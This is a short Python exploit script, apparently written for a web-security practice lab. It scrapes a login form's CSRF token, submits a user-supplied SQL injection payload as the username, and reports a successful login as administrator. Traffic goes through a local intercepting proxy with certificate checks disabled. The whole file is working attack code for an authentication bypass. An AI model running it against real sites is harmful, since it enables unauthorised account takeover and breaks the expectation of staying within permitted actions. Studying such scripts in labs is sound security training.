import requests
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }

def get_csrf(s, url):
    print("[+] Inside Get CSRF")
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf


def exploit_sqli(s, url, payload):
    print("[+] Inside Expolit Sqli")
    csrf = get_csrf(s, url)
    print(csrf)
    data = {"csrf": csrf,
            "username": payload,
            "password": "sfgf"}
    print(data)
    r = s.post(url, data=data, verify=False, proxies=proxies)
    if "Log out" in r.text:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "administrator"' % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    if exploit_sqli(s, url, payload):
        print("[+] SQL injection successfully logged in as administrator")
    else:
        print("[-] SQL injection unsuccessful")
